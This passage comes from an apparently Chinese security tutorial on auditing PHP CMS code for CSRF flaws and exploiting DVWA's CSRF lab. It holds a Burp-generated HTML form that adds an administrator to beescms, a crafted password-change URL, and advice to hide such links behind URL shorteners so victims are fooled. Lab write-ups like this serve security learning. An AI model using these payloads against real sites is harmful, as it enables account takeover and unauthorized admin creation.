id=\"CSRF漏洞挖掘\"><a href=\"#CSRF漏洞挖掘\" class=\"headerlink\" title=\"CSRF漏洞挖掘\"></a>CSRF漏洞挖掘</h1><p>CSRF的话，肯定是利用管理员的权限来进行某些操作，所以我们在进行代码审计的时候，可以关注一下后台文件，看是否存在CSRF漏洞</p>\n<h2 id=\"xhcms\"><a href=\"#xhcms\" class=\"headerlink\" title=\"xhcms\"></a>xhcms</h2><p>登录后台界面，发现有删除文章的权限<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152279.png\" alt=\"在这里插入图片描述\"><br>抓删除文件时的包<br>发送到重放模块，利用bp自带的<code>CSRF poc</code>进行恶意语句构造<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152447.png\" alt=\"在这里插入图片描述\"><br>可以发现这里是未检测token的，因此是极有可能存在CSRF的，我们复制到文件中并命名为<code>xhcms.html</code><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152436.png\" alt=\"在这里插入图片描述\"><br>点击访问<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152513.png\" alt=\"在这里插入图片描述\"><br>访问<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152565.png\" alt=\"在这里插入图片描述\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意：这个是在同一个浏览器下的情况，此时只有这个浏览器上仍然存有管理员的信息，能够直接执行语句，当换到其他浏览器时，就无法执行删除语句，访问会跳转到登录界面</p></blockquote>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152598.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"beescms\"><a href=\"#beescms\" class=\"headerlink\" title=\"beescms\"></a>beescms</h2><p>登录后台，发现有添加管理员界面，随便输入一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152907.png\" alt=\"在这里插入图片描述\"><br>抓包，发送到重放模块<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152935.png\" alt=\"在这里插入图片描述\"></p>\n<p>未发现Token，可能存在CSRF，这个时候我们自定义信息，接下来利用bp构造poc，得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>html<span class=\"token operator\">></span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> <span class=\"token constant\">CSRF</span> PoC <span class=\"token operator\">-</span> generated by Burp Suite Professional <span class=\"token operator\">--</span><span class=\"token operator\">></span>\n  <span class=\"token operator\">&lt;</span>body<span class=\"token operator\">></span>\n  <span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span>history<span class=\"token operator\">.</span><span class=\"token function\">pushState</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"http://127.0.0.1:8080/beescms/admin/admin_admin.php?nav=list_admin_user&amp;admin_p_nav=user\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"POST\"</span> enctype<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"multipart/form-data\"</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"admin&amp;#95;name\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1231\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"admin&amp;#95;password\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1231\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"admin&amp;#95;password2\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1231\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"admin&amp;#95;nich\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1231\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"purview\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"admin&amp;#95;admin\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1231\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"admin&amp;#95;mail\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1&amp;#64;qq&amp;#46;com&amp;#9;&amp;#9;\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"admin&amp;#95;tel\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1234\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"is&amp;#95;disable\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"0\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"action\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"save&amp;#95;admin\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"submit\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"ç&amp;#161;&amp;#174;å&amp;#174;&amp;#154;\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"submit\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Submit request\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">></span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">></span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>复制到文件中并命名为beescms.html<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152036.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152046.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152133.png\" alt=\"在这里插入图片描述\"><br>管理员添加成功</p>\n<h1 id=\"靶场实战\"><a href=\"#靶场实战\" class=\"headerlink\" title=\"靶场实战\"></a>靶场实战</h1><h2 id=\"DVWA\"><a href=\"#DVWA\" class=\"headerlink\" title=\"DVWA\"></a>DVWA</h2><h3 id=\"low\"><a href=\"#low\" class=\"headerlink\" title=\"low\"></a>low</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152279.png\" alt=\"在这里插入图片描述\"><br>发现输入修改密码界面，随便输入一下尝试<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152562.png\" alt=\"在这里插入图片描述\"><br>发现url变化，说明是GET传参，我们可以进行自己构造payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/DVWA-master/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>访问<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152631.png\" alt=\"在这里插入图片描述\"><br>直接修改了密码，这里的话可见应该是没有什么防护的，但是这个的话在实战中也太明显了，就算构造出了链接，受害者一眼就能看出来这个是修改密码的，也就意味着无法实现CSRF了，这个时候我们该怎么办呢，可以用短链接来缩短链接，给它伪装一下，短链接生成网址<br><a href=\"https://www.duanlianjie.net/\">https://www.duanlianjie.net/</a><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152619.png\" alt=\"在这里插入图片描述\"><br>访问这个网址，观察url变化<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152555.png\" alt=\"在这里插入图片描述\"><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152677.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152944.png\" alt=\"在这里插入图片描述\"><br>成功修改密码。<br>此时来看一下源代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Change'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// Get input</span>\n    <span class=\"token variable\">$pass_new</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password_new'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$pass_conf</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password_conf'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Do the passwords match?</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass_new</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$pass_conf</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// They do!</span>\n        <span class=\"token variable\">$pass_new</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$pass_new</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$pass_new</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass_new</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Update the database</span>\n        <span class=\"token variable\">$insert</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"UPDATE `users` SET password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass_new</span></span>' WHERE user = '\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">dvwaCurrentUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"';\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$insert</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Feedback for the user</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>Password Changed.&lt;/pre>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// Issue with passwords matching</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>Passwords did not match.&lt;/pre>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_null</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$___mysqli_res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>不难看出代码中的过滤方式是<code>mysqli_real_escape_string</code>函数，这个函数的作用是<code>转义特殊字符</code>，那么在这里的话它对CSRF是没有影响的，这里的话其实还有一种攻击方式，就是利用burpsuite自带的CSRF poc进行构造，具体过程如下<br>我们先随便输入一下，然后抓包<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152080.png\" alt=\"在这里插入图片描述\"><br>利用burpsuite自带的CSRF工具进行构造<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152144.png\" alt=\"在这里插入图片描述\"><br>放入html文件中，而后访问（此时携带了刚刚在dvwa中的cookie）<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152171.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152228.png\" alt=\"在这里插入图片描述\"><br>成功修改</p>\n<h3 id=\"medium\"><a href=\"#medium\" class=\"headerlink\" title=\"medium\"></a>medium</h3><p>看一下源代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Change'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// Checks to see where the request came from</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'HTTP_REFERER'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'SERVER_NAME'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// Get input</span>\n        <span class=\"token variable\">$pass_new</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password_new'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$pass_conf</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password_conf'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Do the passwords match?</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass_new</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$pass_conf</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">// They do!</span>\n            <span class=\"token variable\">$pass_new</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$pass_new</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$pass_new</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass_new</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token comment\">// Update the database</span>\n            <span class=\"token variable\">$insert</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"UPDATE `users` SET password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass_new</span></span>' WHERE user = '\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">dvwaCurrentUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"';\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$insert</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token comment\">// Feedback for the user</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>Password Changed.&lt;/pre>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">// Issue with passwords matching</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>Passwords did not match.&lt;/pre>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// Didn't come from a trusted source</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>That request didn't look correct.&lt;/pre>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_null</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token 